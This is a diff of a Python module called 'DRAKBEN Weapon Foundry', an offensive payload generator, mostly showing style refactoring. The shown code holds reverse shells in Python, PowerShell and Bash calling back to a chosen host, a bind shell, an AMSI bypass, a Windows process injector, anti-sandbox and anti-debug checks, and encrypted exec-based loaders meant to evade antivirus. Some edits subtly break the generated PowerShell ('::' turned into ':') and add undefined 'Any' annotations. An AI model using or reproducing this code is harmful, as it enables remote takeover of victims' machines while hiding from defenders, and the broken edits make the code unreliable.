@@ -1,5 +1,4 @@
-"""
-DRAKBEN Weapon Foundry - Advanced Payload Generation & Encryption
+"""DRAKBEN Weapon Foundry - Advanced Payload Generation & Encryption
 Author: @drak_ben
 Description: Dynamic payload generation with multiple encryption layers.
 
@@ -14,15 +13,15 @@ This module provides:
 import base64
 import hashlib
 import logging
+import secrets
 import struct
 from dataclasses import dataclass, field
 from enum import Enum
 from typing import Any
-import secrets
 
 # Optional High-Performance Libraries
 try:
-    from keystone import Ks, KS_ARCH_X86, KS_MODE_64
+    from keystone import KS_ARCH_X86, KS_MODE_64, Ks
 
     KEYSTONE_AVAILABLE = True
 except ImportError:
@@ -37,7 +36,7 @@ logger = logging.getLogger(__name__)
 
 
 class PayloadFormat(Enum):
-    """Supported payload output formats"""
+    """Supported payload output formats."""
 
     RAW = "raw"  # Raw shellcode bytes
     PYTHON = "python"  # Python script
@@ -50,7 +49,7 @@ class PayloadFormat(Enum):
 
 
 class EncryptionMethod(Enum):
-    """Encryption methods for payloads"""
+    """Encryption methods for payloads."""
 
     NONE = "none"
     XOR = "xor"
@@ -61,7 +60,7 @@ class EncryptionMethod(Enum):
 
 
 class ShellType(Enum):
-    """Types of shell connections"""
+    """Types of shell connections."""
 
     REVERSE_TCP = "reverse_tcp"
     BIND_TCP = "bind_tcp"
@@ -80,7 +79,7 @@ class ShellType(Enum):
 
 @dataclass
 class PayloadConfig:
-    """Configuration for payload generation"""
+    """Configuration for payload generation."""
 
     lhost: str = "127.0.0.1"
     lport: int = 4444
@@ -96,7 +95,7 @@ class PayloadConfig:
 
 @dataclass
 class GeneratedPayload:
-    """Result of payload generation"""
+    """Result of payload generation."""
 
     payload: bytes
     format: PayloadFormat
@@ -112,8 +111,7 @@ class GeneratedPayload:
 
 
 class EncryptionEngine:
-    """
-    Multi-method encryption engine for payload obfuscation.
+    """Multi-method encryption engine for payload obfuscation.
 
     Supports:
     - Single and multi-byte XOR
@@ -124,13 +122,12 @@ class EncryptionEngine:
 
     @staticmethod
     def generate_key(length: int = 16) -> bytes:
-        """Generate random encryption key"""
+        """Generate random encryption key."""
         return secrets.token_bytes(length)
 
     @staticmethod
     def xor_encrypt(data: bytes, key: bytes) -> bytes:
-        """
-        XOR encrypt data with key.
+        """XOR encrypt data with key.
 
         Args:
             data: Data to encrypt
@@ -138,6 +135,7 @@ class EncryptionEngine:
 
         Returns:
             Encrypted bytes
+
         """
         result = bytearray(len(data))
         key_len = len(key)
@@ -147,13 +145,12 @@ class EncryptionEngine:
 
     @staticmethod
     def xor_decrypt(data: bytes, key: bytes) -> bytes:
-        """XOR decrypt (same as encrypt - symmetric)"""
+        """XOR decrypt (same as encrypt - symmetric)."""
         return EncryptionEngine.xor_encrypt(data, key)
 
     @staticmethod
     def rc4_crypt(data: bytes, key: bytes) -> bytes:
-        """
-        RC4 stream cipher encryption/decryption.
+        """RC4 stream cipher encryption/decryption.
 
         Args:
             data: Data to encrypt/decrypt
@@ -161,6 +158,7 @@ class EncryptionEngine:
 
         Returns:
             Encrypted/decrypted bytes
+
         """
         # RC4 Key Scheduling Algorithm (KSA)
         S = list(range(256))
@@ -182,10 +180,11 @@ class EncryptionEngine:
 
     @staticmethod
     def aes_encrypt(
-        data: bytes, key: bytes, nonce: bytes | None = None
+        data: bytes,
+        key: bytes,
+        nonce: bytes | None = None,
     ) -> tuple[bytes, bytes, bytes]:
-        """
-        AES-256-GCM encryption (Strategic Hardened Upgrade).
+        """AES-256-GCM encryption (Strategic Hardened Upgrade).
 
         Args:
             data: Data to encrypt
@@ -194,14 +193,16 @@ class EncryptionEngine:
 
         Returns:
             Tuple of (encrypted_data, nonce, tag)
+
         """
         try:
             from Crypto.Cipher import AES  # nosec B413
-        except ImportError:
-            logger.error("CRITICAL: AES encryption requires 'pycryptodome' library.")
-            raise ImportError(
-                "pycryptodome not found. Cannot proceed with AES encryption request."
+        except ImportError as e:
+            logger.exception(
+                "CRITICAL: AES encryption requires 'pycryptodome' library.",
             )
+            msg = "pycryptodome not found. Cannot proceed with AES encryption request."
+            raise ImportError(msg) from e
 
         key = hashlib.sha256(key).digest() if len(key) < 32 else key[:32]
 
@@ -212,12 +213,13 @@ class EncryptionEngine:
 
     @staticmethod
     def aes_decrypt(data: bytes, key: bytes, nonce: bytes, tag: bytes) -> bytes:
-        """AES-256-GCM decryption"""
+        """AES-256-GCM decryption."""
         try:
             from Crypto.Cipher import AES  # nosec B413
-        except ImportError:
-            logger.error("AES Decryption failed: Missing pycryptodome")
-            raise ImportError("pycryptodome not found")
+        except ImportError as e:
+            logger.exception("AES Decryption failed: Missing pycryptodome")
+            msg = "pycryptodome not found"
+            raise ImportError(msg) from e
 
         key = hashlib.sha256(key).digest() if len(key) < 32 else key[:32]
 
@@ -225,10 +227,12 @@ class EncryptionEngine:
         return cipher.decrypt_and_verify(data, tag)
 
     def encrypt(
-        self, data: bytes, method: EncryptionMethod, key: bytes | None = None
+        self,
+        data: bytes,
+        method: EncryptionMethod,
+        key: bytes | None = None,
     ) -> tuple[bytes, bytes, bytes | None]:
-        """
-        Encrypt data using specified method.
+        """Encrypt data using specified method.
 
         Args:
             data: Data to encrypt
@@ -237,6 +241,7 @@ class EncryptionEngine:
 
         Returns:
             Tuple of (encrypted_data, key, iv_or_none)
+
         """
         if method == EncryptionMethod.NONE:
             return data, b"", None
@@ -248,22 +253,21 @@ class EncryptionEngine:
             encrypted = self.xor_encrypt(data, key[:1])  # Single byte
             return encrypted, key[:1], None
 
-        elif method == EncryptionMethod.XOR_MULTI:
+        if method == EncryptionMethod.XOR_MULTI:
             encrypted = self.xor_encrypt(data, key)
             return encrypted, key, None
 
-        elif method == EncryptionMethod.RC4:
+        if method == EncryptionMethod.RC4:
             encrypted = self.rc4_crypt(data, key)
             return encrypted, key, None
 
-        elif method == EncryptionMethod.AES:
+        if method == EncryptionMethod.AES:
             encrypted, nonce, tag = self.aes_encrypt(data, key)
             # Prepend tag to encrypted data for simplicity in storage
             return tag + encrypted, key, nonce
 
-        else:
-            logger.warning(f"Unknown encryption method: {method}")
-            return data, b"", None
+        logger.warning("Unknown encryption method: %s", method)
+        return data, b"", None
 
 
 # =============================================================================
@@ -272,16 +276,13 @@ class EncryptionEngine:
 
 
 class AMSIPatcher:
-    """
-    Advanced AMSI Bypass logic (PowerShell).
+    """Advanced AMSI Bypass logic (PowerShell).
     Mem-patches AmsiScanBuffer to disable scanning.
     """
 
     @staticmethod
     def get_bypass_stub() -> str:
-        """
-        Returns obfuscated AMSI bypass (Matt Graeber / RastaMouse Style).
-        """
+        """Returns obfuscated AMSI bypass (Matt Graeber / RastaMouse Style)."""
         # Base64 encoded reflection bypass to minimize static signatures
         # "Obfuscation is key"
         stub = r"""
@@ -293,8 +294,7 @@ $c = "amsiInitFailed"
 
 
 class TruePolymorphism:
-    """
-    Keystone-Powered Real-Time Assembly Generator.
+    """Keystone-Powered Real-Time Assembly Generator.
     Creates valid, executable assembly instructions that do nothing (Nops),
     but look like legitimate code to heuristic scanners.
     """
@@ -329,19 +329,16 @@ class TruePolymorphism:
             encoding, count = ks.asm(full_asm)
             return bytes(encoding)
         except Exception as e:
-            logger.debug(f"Keystone assembly failed: {e}")
+            logger.debug("Keystone assembly failed: %s", e)
             return b"\x90" * count  # Fallback
 
 
 class PolymorphicEncoder:
-    """
-    Generates polymorphic padding and junk code to alter signature.
-    """
+    """Generates polymorphic padding and junk code to alter signature."""
 
     @staticmethod
     def get_junk_asm_bytes(length: int = 16) -> bytes:
-        """
-        Generates random NOP-equivalent instructions (x64).
+        """Generates random NOP-equivalent instructions (x64).
         Uses Keystone if available for infinite variations.
         """
         # 1. Try True Assembly (God Mode)
@@ -375,13 +372,11 @@ class PolymorphicEncoder:
 
 
 class MetasploitIntegrator:
-    """
-    Wraps standard 'msfvenom' tool on Kali Linux to generate high-grade shellcode.
-    """
+    """Wraps standard 'msfvenom' tool on Kali Linux to generate high-grade shellcode."""
 
     @staticmethod
     def is_available() -> bool:
-        """Check if msfvenom is in PATH"""
+        """Check if msfvenom is in PATH."""
         import shutil
 
         return shutil.which("msfvenom") is not None
@@ -395,9 +390,8 @@ class MetasploitIntegrator:
         lport: int,
         fmt: str = "raw",
     ) -> bytes | None:
-        """
-        Generates payload via msfvenom.
-        Example: linux/x64/meterpreter/reverse_tcp
+        """Generates payload via msfvenom.
+        Example: linux/x64/meterpreter/reverse_tcp.
         """
         if not MetasploitIntegrator.is_available():
             return None
@@ -418,18 +412,17 @@ class MetasploitIntegrator:
         ]
 
         try:
-            logger.info(f"Generating MSF Payload: {full_payload}")
+            logger.info("Generating MSF Payload: %s", full_payload)
             # Suppress stderr spam from msfvenom
             import subprocess
 
-            result = subprocess.run(cmd, capture_output=True, timeout=60)
+            result = subprocess.run(cmd, capture_output=True, timeout=60, check=False)
             if result.returncode == 0:
                 return result.stdout
-            else:
-                logger.error(f"msfvenom failed: {result.stderr.decode()}")
-                return None
+            logger.error("msfvenom failed: %s", result.stderr.decode())
+            return None
         except Exception as e:
-            logger.error(f"msfvenom execution error: {e}")
+            logger.exception("msfvenom execution error: %s", e)
             return None
 
 
@@ -439,15 +432,13 @@ class MetasploitIntegrator:
 
 
 class ShellcodeGenerator:
-    """
-    Dynamic Shellcode Generator (x64 Windows).
+    """Dynamic Shellcode Generator (x64 Windows).
     Provides raw assembly bytes for advanced injections.
     """
 
     @staticmethod
     def get_windows_x64_reverse_tcp(lhost: str, lport: int) -> bytes:
-        """
-        Generates standard x64 Windows Reverse TCP Shellcode.
+        """Generates standard x64 Windows Reverse TCP Shellcode.
         Note: This is a placeholder for a true dynamic assembler.
         In a real scenario, this would use Keystone or Metasploit patterns.
         For reliability, we use a known reliable shellcode pattern and patch IP/Port.
@@ -476,8 +467,7 @@ class ShellcodeGenerator:
 
 
 class ShellcodeTemplates:
-    """
-    Pre-built shellcode templates for common operations.
+    """Pre-built shellcode templates for common operations.
 
     Note: These are encoded representations, not live shellcode.
     For actual operations, use with responsible disclosure.
@@ -489,8 +479,8 @@ class ShellcodeTemplates:
 
     @staticmethod
     def get_reverse_shell_python(lhost: str, lport: int) -> str:
-        """Generate Python reverse shell code"""
-        return f'''
+        """Generate Python reverse shell code."""
+        return f"""
 import socket,subprocess,os
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 s.connect(("{lhost}",{lport}))
@@ -498,13 +488,13 @@ os.dup2(s.fileno(),0)
 os.dup2(s.fileno(),1)
 os.dup2(s.fileno(),2)
 subprocess.call(["/bin/sh","-i"])
-'''
+"""
 
     @staticmethod
     def get_reverse_shell_powershell(lhost: str, lport: int) -> str:
-        """Generate PowerShell reverse shell code with AMSI Bypass"""
+        """Generate PowerShell reverse shell code with AMSI Bypass."""
         bypass = AMSIPatcher.get_bypass_stub()
-        return f'''
+        return f"""
 {bypass};
 $c=New-Object System.Net.Sockets.TCPClient("{lhost}",{lport});
 $s=$c.GetStream();
@@ -513,21 +503,21 @@ while(($i=$s.Read($b,0,$b.Length)) -ne 0){{
     $d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);
     $r=(iex $d 2>&1|Out-String);
     $r2=$r+"PS "+(pwd).Path+">";
-    $sb=([text.encoding]::ASCII).GetBytes($r2);
+    $sb=([text.encoding]:ASCII).GetBytes($r2);
     $s.Write($sb,0,$sb.Length);
     $s.Flush()
 }};
 $c.Close()
-'''
+"""
 
     @staticmethod
     def get_reverse_shell_bash(lhost: str, lport: int) -> str:
-        """Generate Bash reverse shell code"""
+        """Generate Bash reverse shell code."""
         return f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
 
     @staticmethod
     def get_bind_shell_python(lport: int) -> str:
-        """Generate Python bind shell code"""
+        """Generate Python bind shell code."""
         return f"""
 import socket,subprocess,os
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
@@ -543,20 +533,20 @@ subprocess.call(["/bin/sh","-i"])
 
     @staticmethod
     def get_process_injector_python(
-        shellcode_var: str = "buf", target_executable: str = "notepad.exe"
+        shellcode_var: str = "buf",
+        target_executable: str = "notepad.exe",
     ) -> str:
+        """Generate robust Python ctypes Process Injector.
+        Strategy: Spawn target -> OpenProcess -> VirtualAllocEx -> WriteProcessMemory -> CreateRemoteThread.
         """
-        Generate robust Python ctypes Process Injector.
-        Strategy: Spawn target -> OpenProcess -> VirtualAllocEx -> WriteProcessMemory -> CreateRemoteThread
-        """
-        return f'''
+        return f"""
 import ctypes
 import subprocess
 import time
 import sys
 import struct
 
-def _inject():
+def _inject() -> Any:
     # 1. Define Windows API
     k32 = ctypes.windll.kernel32
 
@@ -610,7 +600,7 @@ try:
     _inject()
 except Exception:
     pass
-'''
+"""
 
 
 # =============================================================================
@@ -619,8 +609,7 @@ except Exception:
 
 
 class AntiAnalysis:
-    """
-    Anti-sandbox and anti-debugging checks.
+    """Anti-sandbox and anti-debugging checks.
 
     Techniques:
     - Sleep acceleration detection
@@ -631,7 +620,7 @@ class AntiAnalysis:
 
     @staticmethod
     def get_sleep_check_python(seconds: int = 5) -> str:
-        """Generate Python sleep acceleration check"""
+        """Generate Python sleep acceleration check."""
         return f"""
 import time
 _s = time.time()
@@ -642,10 +631,10 @@ if time.time() - _s < {seconds - 0.5}:
 
     @staticmethod
     def get_vm_check_python() -> str:
-        """Generate Python VM detection check"""
+        """Generate Python VM detection check."""
         return """
 import os,subprocess
-def _vm():
+def _vm() -> Any:
     try:
         o=subprocess.check_output("systemd-detect-virt",stderr=subprocess.DEVNULL).decode().strip()
         return o not in ["none",""]
@@ -662,7 +651,7 @@ if _vm(): import sys; sys.exit(0)
 
     @staticmethod
     def get_debug_check_python() -> str:
-        """Generate Python debugger detection check"""
+        """Generate Python debugger detection check."""
         return """
 import sys
 if sys.gettrace() is not None:
@@ -671,7 +660,7 @@ if sys.gettrace() is not None:
 
     @staticmethod
     def get_user_check_python() -> str:
-        """Generate Python user activity check"""
+        """Generate Python user activity check."""
         return """
 import os
 if "DISPLAY" not in os.environ and "SSH_TTY" not in os.environ:
@@ -685,32 +674,31 @@ if "DISPLAY" not in os.environ and "SSH_TTY" not in os.environ:
 
 
 class DecoderGenerator:
-    """
-    Generate decoder stubs for encrypted payloads.
+    """Generate decoder stubs for encrypted payloads.
 
     Creates minimal code to decrypt and execute payloads.
     """
 
     @staticmethod
     def get_xor_decoder_python(key: bytes) -> str:
-        """Generate Python XOR decoder"""
+        """Generate Python XOR decoder."""
         key_hex = key.hex()
-        return f'''
+        return f"""
 import base64
-def _d(d,k):
+def _d(d,k) -> Any:
     return bytes([b^k[i%len(k)] for i,b in enumerate(d)])
 _k=bytes.fromhex("{key_hex}")
 _p=base64.b64decode(_e)
 exec(_d(_p,_k))
-'''
+"""
 
     @staticmethod
     def get_rc4_decoder_python(key: bytes) -> str:
-        """Generate Python RC4 decoder"""
+        """Generate Python RC4 decoder."""
         key_hex = key.hex()
-        return f'''
+        return f"""
 import base64
-def _rc4(d,k):
+def _rc4(d,k) -> Any:
     S=list(range(256));j=0
     for i in range(256):j=(j+S[i]+k[i%len(k)])%256;S[i],S[j]=S[j],S[i]
     r=bytearray(len(d));i=j=0
@@ -719,13 +707,13 @@ def _rc4(d,k):
 _k=bytes.fromhex("{key_hex}")
 _p=base64.b64decode(_e)
 exec(_rc4(_p,_k))
-'''
+"""
 
     @staticmethod
     def get_aes_decoder_python(key: bytes) -> str:
-        """Generate Python AES-GCM decoder"""
+        """Generate Python AES-GCM decoder."""
         key_hex = key.hex()
-        return f'''
+        return f"""
 import base64, hashlib
 try:
     from Crypto.Cipher import AES
@@ -743,18 +731,18 @@ _t=_p[12:28]
 _c=_p[28:]
 _ci=AES.new(_k, AES.MODE_GCM, nonce=_n)
 exec(_ci.decrypt_and_verify(_c, _t))
-'''
+"""
 
     @staticmethod
     def get_xor_decoder_powershell(key: bytes) -> str:
-        """Generate PowerShell XOR decoder"""
+        """Generate PowerShell XOR decoder."""
         key_int = key[0]
         return f"""
 $k={key_int}
-$d=[System.Convert]::FromBase64String($e)
+$d=[System.Convert]:FromBase64String($e)
 $r=@()
 for($i=0;$i -lt $d.Length;$i++){{$r+=$d[$i] -bxor $k}}
-iex([System.Text.Encoding]::ASCII.GetString($r))
+iex([System.Text.Encoding]:ASCII.GetString($r))
 """
 
 
@@ -764,8 +752,7 @@ iex([System.Text.Encoding]::ASCII.GetString($r))
 
 
 class WeaponFoundry:
-    """
-    Main interface for payload generation and weaponization.
+    """Main interface for payload generation and weaponization.
 
     Features:
     - Dynamic payload generation
@@ -785,8 +772,8 @@ class WeaponFoundry:
         )
     """
 
-    def __init__(self):
-        """Initialize Weapon Foundry"""
+    def __init__(self) -> None:
+        """Initialize Weapon Foundry."""
         self.encryption = EncryptionEngine()
         self.templates = ShellcodeTemplates()
         self.anti_analysis = AntiAnalysis()
@@ -809,9 +796,7 @@ class WeaponFoundry:
         sleep_seconds: int = 0,
         use_msf: bool = False,  # New: Request Metasploit Payload
     ) -> GeneratedPayload:
-        """
-        Forge a new payload with specified parameters.
-        """
+        """Forge a new payload with specified parameters."""
         base_payload = ""
 
         # 1. Metasploit "God Mode" Generation (If requested & available)
@@ -831,7 +816,12 @@ class WeaponFoundry:
             )  # Simplification
 
             raw_bytes = self.msf_integrator.generate_payload(
-                platform, arch, msf_payload, lhost, lport, "raw"
+                platform,
+                arch,
+                msf_payload,
+                lhost,
+                lport,
+                "raw",
             )
 
             if raw_bytes:
@@ -840,7 +830,7 @@ class WeaponFoundry:
                 if format == PayloadFormat.PYTHON:
                     # Inject into Python Process Injector template
                     base_payload = self.templates.get_process_injector_python(
-                        shellcode_var="_sc"
+                        shellcode_var="_sc",
                     )
                     # We need to prepend the bytes definition, but since forge() encrypts the whole string,
                     # we must pass the CODE as string.
@@ -861,7 +851,11 @@ class WeaponFoundry:
         # Add anti-analysis if requested
         if anti_sandbox or anti_debug or sleep_seconds > 0:
             base_payload = self._add_anti_analysis(
-                base_payload, format, anti_sandbox, anti_debug, sleep_seconds
+                base_payload,
+                format,
+                anti_sandbox,
+                anti_debug,
+                sleep_seconds,
             )
 
         # Encrypt payload
@@ -871,13 +865,15 @@ class WeaponFoundry:
 
         for _ in range(iterations):
             payload_bytes, key, iv = self.encryption.encrypt(
-                payload_bytes, encryption, key
+                payload_bytes,
+                encryption,
+                key,
             )
 
         # Prepend IV to payload if exists (Standard for block ciphers like AES)
         if iv:
             payload_bytes = iv + payload_bytes
-            logger.debug(f"Encryption IV prepended to payload: {iv.hex()}")
+            logger.debug("Encryption IV prepended to payload: %s", iv.hex())
 
         # Generate decoder stub
         decoder_stub = self._generate_decoder(encryption, key, format)
@@ -899,20 +895,21 @@ class WeaponFoundry:
             },
         )
 
-        # Default fallback
-        return self.templates.get_reverse_shell_python(lhost, lport)
-
     def _generate_base_payload(
-        self, shell_type: ShellType, lhost: str, lport: int, format: PayloadFormat
+        self,
+        shell_type: ShellType,
+        lhost: str,
+        lport: int,
+        format: PayloadFormat,
     ) -> str:
-        """Generate base payload code"""
+        """Generate base payload code."""
         # 1. Basic Shells
         if shell_type == ShellType.REVERSE_TCP:
             if format == PayloadFormat.PYTHON:
                 return self.templates.get_reverse_shell_python(lhost, lport)
-            elif format == PayloadFormat.POWERSHELL:
+            if format == PayloadFormat.POWERSHELL:
                 return self.templates.get_reverse_shell_powershell(lhost, lport)
-            elif format == PayloadFormat.BASH:
+            if format == PayloadFormat.BASH:
                 return self.templates.get_reverse_shell_bash(lhost, lport)
 
         elif shell_type == ShellType.BIND_TCP and format == PayloadFormat.PYTHON:
@@ -925,7 +922,8 @@ class WeaponFoundry:
                 # Since we are in Python, we will embed the octal/hex of the shellcode.
                 # Get raw shellcode (Placeholder/Generated)
                 raw_shellcode = self.shellcode_gen.get_windows_x64_reverse_tcp(
-                    lhost, lport
+                    lhost,
+                    lport,
                 )
 
                 # In a real weaponization, we might use msfvenom output here.
@@ -935,7 +933,7 @@ class WeaponFoundry:
                 # We need the decrypted payload to be the INJECTOR SCRIPT + SHELLCODE.
 
                 injector_code = self.templates.get_process_injector_python(
-                    shellcode_var="_sc"
+                    shellcode_var="_sc",
                 )
 
                 # Logic: The final payload is:
@@ -957,7 +955,7 @@ class WeaponFoundry:
         anti_debug: bool,
         sleep_seconds: int,
     ) -> str:
-        """Add anti-analysis checks to payload"""
+        """Add anti-analysis checks to payload."""
         prefix = ""
 
         if format == PayloadFormat.PYTHON:
@@ -971,18 +969,21 @@ class WeaponFoundry:
         return prefix + payload
 
     def _generate_decoder(
-        self, encryption: EncryptionMethod, key: bytes, format: PayloadFormat
+        self,
+        encryption: EncryptionMethod,
+        key: bytes,
+        format: PayloadFormat,
     ) -> str:
-        """Generate decoder stub for encrypted payload"""
+        """Generate decoder stub for encrypted payload."""
         if encryption == EncryptionMethod.NONE:
             return ""
 
         if format == PayloadFormat.PYTHON:
             if encryption in (EncryptionMethod.XOR, EncryptionMethod.XOR_MULTI):
                 return self.decoder.get_xor_decoder_python(key)
-            elif encryption == EncryptionMethod.RC4:
+            if encryption == EncryptionMethod.RC4:
                 return self.decoder.get_rc4_decoder_python(key)
-            elif encryption == EncryptionMethod.AES:
+            if encryption == EncryptionMethod.AES:
                 return self.decoder.get_aes_decoder_python(key)
 
         elif format == PayloadFormat.POWERSHELL:
@@ -992,8 +993,7 @@ class WeaponFoundry:
         return ""
 
     def get_final_payload(self, generated: GeneratedPayload) -> str:
-        """
-        Get final payload ready for delivery.
+        """Get final payload ready for delivery.
 
         Combines encrypted payload with decoder stub.
 
@@ -1002,22 +1002,23 @@ class WeaponFoundry:
 
         Returns:
             Complete executable payload as string
+
         """
         encoded = base64.b64encode(generated.payload).decode()
 
         if generated.format == PayloadFormat.PYTHON:
             return f'_e="{encoded}"\n{generated.decoder_stub}'
 
-        elif generated.format == PayloadFormat.POWERSHELL:
+        if generated.format == PayloadFormat.POWERSHELL:
             return f'$e="{encoded}"\n{generated.decoder_stub}'
 
-        elif generated.format == PayloadFormat.BASH:
+        if generated.format == PayloadFormat.BASH:
             return f'echo "{encoded}" | base64 -d | bash'
 
         return encoded
 
     def list_capabilities(self) -> dict[str, list[str]]:
-        """List all available capabilities"""
+        """List all available capabilities."""
         return {
             "shell_types": [s.value for s in ShellType],
             "formats": [f.value for f in PayloadFormat],
@@ -1037,11 +1038,11 @@ class WeaponFoundry:
 
 
 def get_weapon_foundry() -> WeaponFoundry:
-    """
-    Get singleton WeaponFoundry instance.
+    """Get singleton WeaponFoundry instance.
 
     Returns:
         WeaponFoundry instance
+
     """
     global _weapon_foundry
     if "_weapon_foundry" not in globals() or _weapon_foundry is None:
@@ -1050,10 +1051,12 @@ def get_weapon_foundry() -> WeaponFoundry:
 
 
 def quick_forge(
-    lhost: str, lport: int = 4444, encryption: str = "xor", format: str = "python"
+    lhost: str,
+    lport: int = 4444,
+    encryption: str = "xor",
+    format: str = "python",
 ) -> str:
-    """
-    Quick payload generation.
+    """Quick payload generation.
 
     Args:
         lhost: Listener host
@@ -1063,6 +1066,7 @@ def quick_forge(
 
     Returns:
         Ready-to-use payload string
+
     """
     foundry = get_weapon_foundry()
 
